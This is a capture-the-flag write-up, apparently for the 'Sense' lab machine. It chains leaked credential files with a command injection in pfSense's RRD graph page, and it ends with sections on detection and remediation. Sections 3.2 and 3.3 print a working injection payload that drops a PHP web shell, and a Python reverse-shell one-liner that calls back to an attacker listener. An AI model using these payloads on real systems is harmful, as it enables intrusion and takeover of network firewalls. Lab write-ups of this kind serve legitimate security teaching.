00 Why this box matters

The firewall admin panel is the crown jewel — and the target

This box hosts a pfSense instance: the web console that configures firewall rules, VPN tunnels, DHCP, and routing for an entire network. Compromising this single panel doesn't just get you a shell on one host — it gets you control of the network's perimeter defenses. That makes it a textbook example of why admin interfaces for security appliances need to be locked down harder than anything else on the network, not left exposed with default-adjacent credentials and unpatched known CVEs.

01 Recon — subdomains that leak secrets

1.1 — Enumerating hidden paths

The root site is the standard pfSense login page. Directory brute-forcing with Gobuster against the host turns up two files that were clearly left behind by an admin who assumed "undocumented" meant "safe".

 gobuster
$ gobuster dir -u http://10.10.10.60 -w /usr/share/wordlists/dirb/common.txt -x txt
# notable hits
/system-users.txt   (Status: 200)
/changelog.txt       (Status: 200)

1.2 — Reading the leaked files

system-users.txt drops a clue pointing at a specific username and a weak/guessable password scheme for the pfSense login. changelog.txt states that two of three known vulnerabilities have been patched — which is effectively a confession that a third, unpatched vulnerability is still live on this install.

Mechanism first

This isn't a technical bug — it's an information disclosure failure. Static files under the webroot with no auth requirement leaked both a credential hint and a roadmap of what's still exploitable. Attackers don't need to guess blind when the target tells them what's broken.

Using the username hinted at in system-users.txt paired with the associated password, we authenticate to the pfSense web UI and land on the standard dashboard.

03 RRD graph command injection

3.1 — Finding the sink

Inside the dashboard, Status → RRD Graphs renders performance graphs by requesting a backend endpoint and passing the graph's name as a URL parameter. That parameter is concatenated directly into a shell command on the backend rather than being sanitized or passed as a safe argument.

Mechanism first

This is OS command injection (matches the third, unpatched CVE hinted at in changelog.txt). The graph-name parameter is trusted as data but executed as code. Anything we control in that parameter runs verbatim on the underlying FreeBSD shell with the privileges of the web service.

3.2 — Dropping a web shell

We abuse the injection point once to write a second, attacker-controlled page to the webroot — a minimal web shell that accepts a command via a URL parameter and executes it on the box.

 webshell
$ curl "http://10.10.10.60/status_rrd_graph_img.php?database=queues;printf%20'<?php system(\$_GET[cmd]); ?>'%20>%20/usr/local/www/shell.php;"
# subsequent commands: /shell.php?cmd=id

3.3 — Upgrading to an interactive shell

With arbitrary command execution confirmed through the planted shell, we pull a Python reverse shell one-liner through it to get an interactive session back on our listener.

 reverse shell
$ nc -lvnp 4444
$ curl "http://10.10.10.60/shell.php?cmd=python%20-c%20'import%20socket,os,pty;s=socket.socket();s.connect((\"10.10.14.5\",4444));[os.dup2(s.fileno(),f)for%20f%20in(0,1,2)];pty.spawn(\"/bin/sh\")'"
# shell caught on listener

05 Detection
  • Alert on requests to status_rrd_graph_img.php (or similar diagnostic endpoints) containing shell metacharacters (;, |, &&, backticks) in query parameters.
  • Monitor the pfSense webroot for newly created .php files outside of update/install windows — a classic web-shell-drop indicator.
  • Flag outbound connections from the firewall appliance itself to unfamiliar external IPs on non-standard ports (reverse shell callbacks).
  • Log and alert on access to any unauthenticated .txt/changelog/status files under the webroot — these should never be reachable pre-auth.
06 Remediation
  1. Patch immediately. Keep pfSense (and every network appliance) on a current, patched release — the changelog itself told us a fix existed for two of three flaws; the third should never have shipped unpatched in a lab.
  2. Remove or protect diagnostic/leftover files. system-users.txt and changelog.txt should never be served from a production webroot without authentication.
  3. Sanitize all input reaching a shell. Graph names, filenames, and any other parameter that ends up in an OS command must be validated against a strict allow-list, never concatenated into a shell string.
  4. Restrict management-plane exposure. Admin panels for firewalls/VPN appliances belong on an out-of-band management network or behind VPN — not reachable from the same segment as general traffic.

Sense is a clean demonstration of a chained low-effort attack: leaked credentials plus an unpatched, publicly known command injection in a security appliance's own admin console. The irony is hard to miss — the device meant to enforce the network's security policy became the softest target on it. Patch cadence and input sanitization aren't optional on anything sitting at the network edge.
